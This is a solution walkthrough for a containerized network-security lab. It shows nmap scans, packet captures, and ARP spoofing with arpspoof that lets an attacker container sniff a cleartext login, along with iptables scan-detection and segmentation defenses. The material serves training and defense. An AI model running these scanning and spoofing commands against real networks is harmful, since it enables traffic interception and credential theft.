# Day 2 Lab — Solution / Verify Walkthrough

## Authorized use only

Same notice as [`README.md`](README.md): only run these commands against the
`server`/`victim` containers this lab starts, on `cyberlab` and this lab's private
`day02-mitm` segment, or your own AWS sandbox in later phases.

## Step-by-step, with actual verified output

All output below was captured from a real run of this lab (`labs/base` up, then
`labs/day02` built and started with `docker compose up -d --build`). Every
`docker compose exec attacker ...` command below was run **from `labs/base`** — see
the README's note on why running it from `labs/day02` fails with `service "attacker"
is not running`.

### 1. Full nmap enumeration

```sh
docker compose exec attacker sh -c "nmap -sS server"
```

Confirmed output:

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 12:45 +0000
Nmap scan report for server (172.19.0.3)
Host is up (0.0000040s latency).
rDNS record for 172.19.0.3: cyberlab-day02-server.cyberlab
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
2121/tcp open  ccproxy-ftp
MAC Address: 7E:56:B8:63:79:50 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
```

Fast, and — same as Day 1 — the service name is a wrong guess made purely from the
port number.

```sh
docker compose exec attacker sh -c "nmap -sS -sV -sC server"
```

Confirmed output (this run took **157.48 seconds** — expect over two minutes; see
below for why):

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 12:45 +0000
Nmap scan report for server (172.19.0.3)
Host is up (0.0000030s latency).
rDNS record for 172.19.0.3: cyberlab-day02-server.cyberlab
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
2121/tcp open  ccproxy-ftp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines,
|   GetRequest, HTTPOptions, Help, Kerberos, LPDString, RPCCheck, RTSPRequest,
|   SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|     220 LegacyAuth Service (LegacyCorp) ready
|     Password required for admin
|   NULL:
|_    220 LegacyAuth Service (LegacyCorp) ready
1 service unrecognized despite returning data. If you know the service/version, please
submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.99%I=7%D=8/12%Time=6A7C6B0B%P=aarch64-unknown-linux-gn
SF:u%r(NULL,2B,"220\x20LegacyAuth\x20Service\x20\(LegacyCorp\)\x20ready\r\
SF:n")%r(GenericLines,4C,"220\x20LegacyAuth\x20Service\x20\(LegacyCorp\)\x
[... fingerprint continues for every probe nmap tried ...]
MAC Address: 7E:56:B8:63:79:50 (Unknown)

Service detection performed. Please report any incorrect results at
https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.48 seconds
```

**Why it takes so long:** `-sV`'s version-detection probes send roughly a dozen
different protocol-specific strings (HTTP `GET`, RTSP, SMB negotiation, DNS queries,
Kerberos, ...) at any port it can't confidently identify. `server`'s tiny two-line
handshake doesn't respond usefully to almost any of them, so nearly every probe runs
out its own timeout before nmap tries the next one — the delays add up to over two
minutes for one unidentified port. No `-sC` script output appears at all: nmap only
runs scripts against services it can name, and it never confidently named this one, so
none applied. The `fingerprint-strings` block is nmap's own fallback: it shows the raw
banner text captured across several probes (`GenericLines`, `GetRequest`, ... all
returned the identical `220 LegacyAuth...` / `331 Password required...` text) even
though it never resolved that into a recognized service name.

### 2. Capture the scan itself

```sh
docker compose exec -d attacker sh -c "tcpdump -i eth0 -w /loot/day02-scan.pcap -U 'tcp port 2121'"
docker compose exec attacker sh -c "nmap -sS server > /dev/null"
docker compose exec attacker sh -c "tshark -r /loot/day02-scan.pcap -T fields -e ip.src -e ip.dst -e tcp.flags -e tcp.srcport -e tcp.dstport"
```

Confirmed output (`tcp.flags`: `0x0002`=SYN, `0x0012`=SYN-ACK, `0x0004`=RST):

```
172.19.0.2   172.19.0.3   0x0002   56001   2121
172.19.0.3   172.19.0.2   0x0012   2121    56001
172.19.0.2   172.19.0.3   0x0004   56001   2121
```

Exactly three packets: attacker's **SYN**, `server`'s **SYN-ACK** confirming the port
is open, and the attacker's **RST** in place of the `ACK` a real client would send.
That's the half-open SYN scan from the content file's Section 1, as real bytes.

Stop the background capture when done:

```sh
docker compose exec attacker sh -c "for p in /proc/[0-9]*; do c=\$(tr -d '\0' < \$p/cmdline 2>/dev/null); case \$c in *tcpdump*) kill -INT \${p#/proc/};; esac; done"
```

### 3. Join the isolated segment

```sh
docker network connect cyberlab-day02-mitm cyberlab-attacker
docker compose exec attacker sh -c "ip -brief addr"
```

Confirmed output (new `eth1`, address will differ per run):

```
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0@if42        UP             172.19.0.2/16
eth1@if47        UP             172.20.0.4/16
```

Get `server`'s and `victim`'s addresses **on `day02-mitm` specifically** (not
`cyberlab` — a container that's on both networks will otherwise resolve to the wrong
one for this purpose):

```sh
docker inspect cyberlab-day02-server --format '{{(index .NetworkSettings.Networks "cyberlab-day02-mitm").IPAddress}}'
docker inspect cyberlab-day02-victim --format '{{(index .NetworkSettings.Networks "cyberlab-day02-mitm").IPAddress}}'
```

Confirmed in this run: `server` = `172.20.0.2`, `victim` = `172.20.0.3` (will differ per
run/environment — use your own output for the next step).

### 4. ARP-spoof and sniff the cleartext exchange

Install `arpspoof` (from the `dsniff` package) just for this session — it's not in the
shared `labs/base` attacker toolbox:

```sh
docker compose exec attacker sh -c "apt-get update -qq && apt-get install -y --no-install-recommends dsniff"
```

Confirmed: installs cleanly (pulls `dsniff` plus its `libnet9`/`libnids1` etc.
dependencies).

Start the capture and both directions of the spoof (substitute your own addresses from
Step 3):

```sh
docker compose exec -d attacker sh -c "tcpdump -i eth1 -w /loot/day02-mitm.pcap -U 'tcp port 2121'"
docker compose exec -d attacker sh -c "arpspoof -i eth1 -t 172.20.0.3 172.20.0.2"
docker compose exec -d attacker sh -c "arpspoof -i eth1 -t 172.20.0.2 172.20.0.3"
```

Confirmed `arpspoof` output (each process logs a continuous stream once running —
sampled from `/loot/arpspoof1.log` and `/loot/arpspoof2.log`):

```
2:8a:f2:e3:74:e4 a6:cb:c0:fd:52:4f 0806 42: arp reply 172.20.0.2 is-at 2:8a:f2:e3:74:e4
2:8a:f2:e3:74:e4 a6:cb:c0:fd:52:4f 0806 42: arp reply 172.20.0.2 is-at 2:8a:f2:e3:74:e4
...
2:8a:f2:e3:74:e4 22:72:af:3:dd:e4 0806 42: arp reply 172.20.0.3 is-at 2:8a:f2:e3:74:e4
2:8a:f2:e3:74:e4 22:72:af:3:dd:e4 0806 42: arp reply 172.20.0.3 is-at 2:8a:f2:e3:74:e4
...
```

`2:8a:f2:e3:74:e4` is the attacker's MAC address on `eth1` — both lines are the
attacker forging replies claiming to be the *other* party's IP, one process per
direction.

After 15+ seconds (at least one `victim` login cycle), read the capture:

```sh
docker compose exec attacker sh -c "tshark -r /loot/day02-mitm.pcap -q -z follow,tcp,ascii,0"
```

**Confirmed output — the full cleartext credential exchange, captured while
MITM'd via ARP spoofing:**

```
===================================================================
Follow: tcp,ascii
Filter: tcp.stream eq 0
Node 0: 172.20.0.3:51264
Node 1: 172.20.0.2:2121
	43
220 LegacyAuth Service (LegacyCorp) ready

12
USER admin

	33
331 Password required for admin

25
PASS CorpVPN!Secret2024

	35
230 User admin logged in, proceed

===================================================================
```

The password `CorpVPN!Secret2024` — real traffic `victim` was sending to `server`
every five seconds — is sitting there in plain text in the capture, purely because the
attacker forged two ARP replies. Neither container's TCP stack, nor the LegacyAuth
protocol itself, did anything wrong at their own layer; the interception happened
entirely at L2, one layer below where the credentials live.

**Cleanup — stop the spoofing and disconnect:**

```sh
docker compose exec attacker sh -c "for p in /proc/[0-9]*; do c=\$(tr -d '\0' < \$p/cmdline 2>/dev/null); case \$c in *arpspoof*|*tcpdump*) kill -9 \${p#/proc/} 2>/dev/null;; esac; done"
docker network disconnect cyberlab-day02-mitm cyberlab-attacker
```

Confirmed: after killing both `arpspoof` processes, their log files stop growing
(checked with `wc -l` a few seconds apart), and after `docker network disconnect`,
`ip -brief addr` inside the attacker container shows only `eth0` again — back to the
lab's default, segmented state.

### 5. Verify command

```sh
docker compose exec attacker sh -c "nmap -sS server > /loot/day02.txt && grep -q open /loot/day02.txt && echo ATTACK_OK"
```

**Confirmed output:** `ATTACK_OK`

## Defense lab — before/after, with confirmed output

### Defense 1 — Segmentation

Nothing to build or re-verify with a command — Section 2 Steps 1–2 above ran entirely
without the attacker ever joining `day02-mitm`, and still fully enumerated `server`.
Step 3 required a separate, explicit `docker network connect` before anything on
`day02-mitm` (including `victim`, and `server`'s cleartext side) became reachable at
all. That contrast — full enumeration without segment access, versus needing a
deliberate extra step to reach the segment where the real damage happened — **is**
this defense working, observed rather than configured.

### Defense 2 — `iptables` scan-detection rule

**Baseline (as shipped):** `labs/day02/server/entrypoint.sh` starts the LegacyAuth
service with no firewall rule at all — confirmed by Step 1's fast, clean scan above.

**Applied and tested** (in a rebuild during verification of this lab; the rule was
reverted afterward so the shipped lab starts undefended, per the content file's
instruction that you add it yourself):

```sh
# added to server/entrypoint.sh, before `exec python3 /server.py`:
iptables -A INPUT -p tcp --dport 2121 -m conntrack --ctstate NEW \
  -m recent --name day02scan --set
iptables -A INPUT -p tcp --dport 2121 -m conntrack --ctstate NEW \
  -m recent --name day02scan --update --seconds 10 --hitcount 5 \
  -j LOG --log-prefix "day02-scan-detect: "
```

(`server`'s Dockerfile already installs `iptables`, and `docker-compose.yml` already
grants `server` the `NET_ADMIN` capability the rule needs — both ship as-is, so
applying the rule is a one-file edit plus `docker compose up -d --build`.)

Fired six quick scans in a row to cross the 5-hits-in-10-seconds threshold:

```sh
docker compose exec attacker sh -c "for i in 1 2 3 4 5 6; do nmap -sS -p 2121 server > /dev/null; done"
```

**Confirmed re-verify** — rather than reading the kernel log directly (containers
don't have `dmesg`/`/proc/kmsg` access by default, and granting it isn't worth the
extra privilege for a lab), the rule's own packet counters prove it fired:

```sh
docker exec cyberlab-day02-server sh -c "iptables -L INPUT -v -n"
```

```
Chain INPUT (policy ACCEPT 48 packets, 2646 bytes)
 pkts bytes target     prot opt in     out     source          destination
   12   624            tcp  --  *   *  0.0.0.0/0       0.0.0.0/0  tcp dpt:2121 ctstate NEW recent: SET name: day02scan side: source mask: 255.255.255.255
    2    88 LOG        tcp  --  *   *  0.0.0.0/0       0.0.0.0/0  tcp dpt:2121 ctstate NEW recent: UPDATE seconds: 10 hit_count: 5 name: day02scan side: source mask: 255.255.255.255 LOG flags 0 level 4 prefix "day02-scan-detect: "
```

The `LOG` rule's counter shows **2 packets matched** — twice during the six-scan burst,
the attacker's source IP had already hit 5+ new connections within the trailing
10-second window, and the rule fired. Confirming which source triggered it:

```sh
docker exec cyberlab-day02-server sh -c "cat /proc/net/xt_recent/day02scan"
```

```
src=172.20.0.3 ttl: 64 last_seen: ... oldest_pkt: 6 ...
src=172.19.0.2 ttl: 47 last_seen: ... oldest_pkt: 8 ...
```

`172.19.0.2` is `cyberlab-attacker`'s address on `cyberlab` — the `recent` module's
own tracking table shows 8 timestamped hits from it, well past the 5-in-10-seconds
threshold that made the `LOG` rule match. (`172.20.0.3` is `victim`'s normal 5-second
login loop, which never gets close to the threshold — the rule doesn't fire on it.)

To go from detection to blocking, swap `-j LOG --log-prefix "..."` for `-j DROP` —
Drill 2 in the content file walks through that exact change against a different port.

### Defense 3 — ARP-anomaly awareness

Not built as a running tool in this lab (that's `arpwatch`/Day 11 territory). The
manual approximation — diffing `arp -a` output on `victim` or `server` before and after
Section 2 Step 4 — would show the entry for the other container's IP changing to the
attacker's MAC once the spoof starts, which is precisely the anomaly a real detector
watches for continuously.

## If something doesn't match

- **`nmap -sS -sV -sC` seems to hang:** it isn't — expect 2+ minutes against the
  unidentified port, as documented above. Give it time before assuming something's
  wrong.
- **`docker compose exec attacker ...` fails with `service "attacker" is not
  running`:** you're running it from `labs/day02`. Run it from `labs/base` instead.
- **`arpspoof: command not found`:** the `apt-get install dsniff` step (Section 2 Step
  4 above) hasn't been run yet in this attacker container session — it doesn't persist
  across `docker compose down`/`up` of `labs/base`, only within a running container's
  lifetime.
- **No cleartext credentials in the `tshark` follow output:** confirm you captured on
  `eth1` (the `day02-mitm` interface), not `eth0`, and that both `arpspoof` processes
  were actually running (check with `docker compose exec attacker sh -c "wc -l
  /loot/arpspoof1.log /loot/arpspoof2.log"` — line counts should be growing).
- **IP addresses differ from this file:** expected — container IPs are assigned by
  Docker per-run and will differ across machines/sessions. Only the protocol text,
  packet-flag sequence, and rule-hit-count behavior matter for comparison.

## Answers reused from the content file

The attack/defense concept mapping and all three drills for Day 2 live in
[`content/day02-networking.md`](../../content/day02-networking.md) (Section 1's layer
table, and Section 4) — worked answers are inline there.
